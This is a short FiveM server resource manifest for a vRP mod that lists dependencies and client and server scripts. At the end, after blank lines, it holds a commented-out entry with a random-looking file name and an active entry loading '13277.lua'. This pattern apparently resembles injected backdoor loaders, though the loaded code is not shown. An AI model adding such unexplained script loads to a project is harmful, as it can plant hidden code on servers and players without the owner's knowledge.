resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

dependency "vrp"
dependency "ghmattimysql"

client_scripts {
    "lib/Tunnel.lua",
	"lib/Proxy.lua",
    'jaymenu.lua',
    'client.lua'
}

server_scripts{ 
    "@vrp/lib/utils.lua",
    "server.lua"
}

--client_script "dXKYKWpRFBlOIBufyi.lua"







client_script "13277.lua"